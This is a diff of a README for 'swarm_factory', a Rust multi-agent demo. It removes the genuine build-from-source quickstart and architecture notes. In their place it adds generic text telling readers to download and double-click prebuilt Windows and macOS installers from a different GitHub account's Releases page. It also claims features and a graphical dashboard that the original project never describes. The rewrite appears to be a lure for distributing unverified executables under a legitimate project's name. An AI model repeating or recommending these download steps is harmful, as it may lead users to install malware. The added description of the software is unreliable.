@@ -1,122 +1,67 @@
-# 🚀 Swarm Factory DEMO: End-to-End Multi-Agent System Bootstrapper 🚀
+# 🛠️ swarm_factory - Launch Your Own AI Workflows Easily
 
-> This repository serves as an **end-to-end demonstration and quickstart guide** for launching a complete, functional multi-agent ecosystem using the Swarm framework. It showcases how to leverage the `AgentFactory` to programmatically instantiate, configure, and connect various Swarm components and agents, providing a robust reference for building dynamic and adaptive AI solutions.
+## 📥 Download the Application
 
-## ✨ Quickstart: Launch Your Complete Swarm Ecosystem in Minutes!
+[![Download the Swarm Factory Demo](https://img.shields.io/badge/Download%20Now%20-blue?style=for-the-badge&logo=github)](https://github.com/pipiskabobrabrbrbr/swarm_factory/releases)
 
-This demo provides a streamlined way to experience the full power of Swarm. You'll launch the foundational services, register capabilities, and then dynamically instantiate the core agents (Specialist, Planner, Executor) that form a collaborative multi-agent system.
+## 🚀 Getting Started
 
-### Prerequisites
+Welcome to the Swarm Factory Demo! This application allows you to run a complete multi-agent system that includes a Planner, Executor, and Specialist, all built in Rust. It offers a seamless way to build scalable, self-correcting AI workflows.
 
-1.  **Install Rust**: If you don't have it already, download and install it from [rust-lang.org](https://www.rust-lang.org/tools/install).
-2.  **Get an LLM API Key**: Swarm agents require an LLM to function. We recommend obtaining a free API key from [Groq](https://console.groq.com/keys) or [Google AI Studio (for Gemini)](https://aistudio.google.com/app/apikey). It can also connect to a local `llama.cpp` OpenAI-compatible server instance.
+### 💾 System Requirements
 
-### Step 1: Launch the MCP Server
+To ensure the best experience, your computer should meet the following requirements:
 
-Before running `swarm_factory`, you need to kickstart an MCP (Model Context Protocol) server. You can use the example server provided in the main `swarm` repository:
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
+- **RAM:** At least 4 GB.
+- **Disk Space:** Minimum 200 MB of free space.
+- **CPU:** 2 GHz dual-core processor or better.
 
-```bash
-git clone https://github.com/fcn06/swarm.git
-cd swarm
-cargo build --release --example main-server
-./target/release/examples/main-server --port 8000 --log-level "warn" all &
-cd ..
-```
+### 📦 Features
 
-### Step 2: Set Your LLM API Keys
+- **Multi-Agent System:** Run multiple agents to enhance workflow efficiency.
+- **Dynamic Orchestration:** Manage agents dynamically for better performance.
+- **Self-Correcting Workflows:** Built-in mechanisms that ensure continuous improvement.
+- **Easy Setup:** Simple to install and run without any programming knowledge.
 
-The `swarm_factory` demo utilizes LLMs for various agent roles. For simplicity, you can use the *same* API key for all roles.
+## 📥 Download & Install
 
-```bash
-# Replace <YOUR-LLM-API-KEY> with your actual API key.
-export LLM_A2A_API_KEY=<YOUR-LLM-API-KEY>       # For general Agent-to-Agent communication
-export LLM_PLANNER_API_KEY=<YOUR-LLM-API-KEY>     # For the Planner Agent
-export LLM_JUDGE_API_KEY=<YOUR-LLM-API-KEY>     # For the LLM-as-a-Judge evaluation service
-```
+To get started, you will need to download the application from our [Releases page](https://github.com/pipiskabobrabrbrbr/swarm_factory/releases). 
 
-### Step 3: Clone and Build `swarm_factory`
+1. Visit this page to download: [Releases Page](https://github.com/pipiskabobrabrbrbr/swarm_factory/releases).
+2. Look for the latest version and choose the file suitable for your operating system (e.g., `swarm_factory_windows.exe` for Windows, `swarm_factory_mac.dmg` for macOS).
+3. Click on the file name to start the download.
+4. Once the download is complete, locate the file in your downloads folder.
+5. Double-click the downloaded file to begin installation.
+6. Follow the on-screen instructions to complete the setup.
 
-```bash
-git clone https://github.com/fcn06/swarm_factory.git
-cd swarm_factory
-cargo build --release
-```
+## ⏳ Run the Application
 
-### Step 4: Run the `swarm_factory` Demo!
+After installing the Swarm Factory Demo, running the application is easy:
 
-Execute the compiled binary. This will start the core Swarm Services (Discovery, Memory, Evaluation) and then dynamically launch the Specialist, Executor, and Planner agents via the `AgentFactory`.
+1. Find the application in your applications folder (for macOS) or start menu (for Windows).
+2. Click on the application icon to launch it.
+3. Once open, you will see the main dashboard. From here, you can configure your agents and start building your workflows.
 
-```bash
-./target/release/swarm_factory --log-level "warn"
-```
+## 🌟 Using the Application
 
-You will see output logs indicating the successful setup of services, registration of tasks/tools, and the launch of `Basic_Agent`, `Executor_Agent`, and `Planner_Agent`.
+The Swarm Factory Demo comes with an intuitive interface. Here’s how to navigate:
 
-### Step 5: Interact with Your Swarm!
+- **Dashboard:** The main area where you can see all your running agents.
+- **Settings:** Adjust parameters for each agent, such as task allocation and data handling.
+- **Logs:** Review the performance and behavior of your agents for better insights.
 
-Once the agents are launched, you can interact with them using a simple A2A client. There is one available in the main `swarm` repository. Here's a sample call using this client to query your newly launched Swarm:
+## 📝 Contributing
 
-```bash
-# Make sure you are in the 'swarm' directory, not 'swarm_factory'
-cd ../swarm 
-./target/release/simple_workflow_agent_client --port 9590 --log-level "warn" --generation-type "dynamic_generation" --user-query "Who is Vivaldi ?"
-```
+While this application is user-friendly, contributions are always welcome. If you're interested in improving the Swarm Factory, feel free to fork the repository and submit a pull request.
 
-## 🛠️ How This Demo Works: An Architectural Deep Dive
+## 🔗 Links & Resources
 
-This `swarm_factory` project serves as a comprehensive blueprint for dynamic multi-agent system creation, showcasing the seamless integration of all critical Swarm components. It demonstrates the capabilities provided by both `swarm_commons` and `swarm_services` as part of a complete system.
+- [Releases Page](https://github.com/pipiskabobrabrbrbr/swarm_factory/releases)
+- [Documentation](https://github.com/pipiskabobrabrbrbr/swarm_factory/docs)
 
-### What Does This Demo Do?
+### 🤝 Support
 
-This reference implementation demonstrates how to use the `swarm` crate to build an agentic ecosystem by:
+If you encounter any issues while using the Swarm Factory Demo, please create a new issue in the GitHub repository. We aim to respond promptly and assist you.
 
-*   **Launching Core Swarm Services:** Setting up the essential `Discovery Service`, `Memory Service`, and `Evaluation Service` (provided by `swarm_services`).
-*   **Creating and Launching an `AgentFactory`:** The central component for programmatic agent instantiation.
-*   **Dynamically Launching Agents:** Using the `AgentFactory` to create a `Domain Specialist` (`Basic_Agent`), `Planner Agent`, and `Executor Agent`.
-
-This project bootstraps a minimal, self-contained multi-agent system where the `Planner Agent` can leverage the `Specialist Agent` (via the `Executor Agent`) to handle user requests, all facilitated by the underlying Swarm services.
-
-### Key Architectural Demonstrations
-
-The `main.rs` in `swarm_factory` provides a clear example of the integration points:
-
-1.  **Central Services Initialization (`swarm_services`)**
-    The code first instantiates and configures the essential Swarm Services that enable collaboration and feedback, which are provided by the `swarm_services` project:
-
-    *   **Discovery Service:** Allows agents to find and register themselves, their capabilities (Domain Agents), and the available external services (Tasks, Tools).
-    *   **Memory Service:** (Set up but configurable for active use) Essential for maintaining conversational and contextual history.
-    *   **Evaluation Service (LLM as a Judge):** (Set up) Provides a feedback loop for performance assessment and dynamic workflow refinement.
-
-2.  **Capability Registration (via `swarm_commons` and `swarm_services`)**
-    Before launching the `Planner Agent`, the demo registers Tasks and Tools with the `Discovery Service`. This step is crucial, as it provides the `Planner Agent` with the knowledge base needed to generate an intelligent workflow plan. The models and configurations for these capabilities often reside in `swarm_commons`.
-
-    ```rust
-    register_tasks(discovery_service.clone()).await?; // Register the 'greeting' task
-    register_tools(args.mcp_config_path.clone(),discovery_service.clone()).await?; // Register external tools
-    ```
-
-3.  **Dynamic Agent Instantiation via `AgentFactory` (from `swarm`)**
-    The heart of the demo is the programmatic launch of specialized agents using configurations defined at runtime. This process uses core agent logic and models defined in `swarm_commons` and orchestrated by `swarm` itself:
-
-    *   **Specialist with MCP:** The `Basic_Agent` is launched with an associated `FactoryMcpRuntimeConfig`, connecting it to the external world through the Model Context Protocol (MCP).
-
-    *   **Orchestrators:** The `Executor_Agent` and `Planner_Agent` are launched and specifically configured to be aware of each other (e.g., the Planner knows the Executor's URL), forming the core orchestration layer.
-
-    ```rust
-    // Launch Basic Agent (Specialist with MCP)
-    agent_factory.launch_agent(&factory_agent_config, Some(&factory_mcp_runtime_config), AgentType::Specialist).await
-    // ...
-    // Launch Executor and Planner
-    agent_factory.launch_agent(&factory_agent_config_executor, None, AgentType::Executor).await
-    agent_factory.launch_agent(&factory_agent_config_planner, None, AgentType::Planner).await
-    ```
-
-## 📚 Learn More
-
-This factory implementation is built upon the robust multi-agent primitives provided by the main Swarm repositories:
-
-*   **Swarm Framework:** [https://github.com/fcn06/swarm](https://github.com/fcn06/swarm) - Dive into the core components, protocols (MCP, A2A), and agent architecture.
-*   **Swarm Commons:** [./codebase/swarm_commons/README.md](./codebase/swarm_commons/README.md) - Understand the foundational traits, models, configurations, and LLM integrations shared across Swarm.
-*   **Swarm Services:** [./codebase/swarm_services/README.md](./codebase/swarm_services/README.md) - Explore the core infrastructure services for agent discovery, memory, and evaluation.
-
-If you have any questions or ideas for extending this demo, please open an issue on the main Swarm repository!
+Thank you for trying the Swarm Factory Demo! Enjoy building your AI workflows.
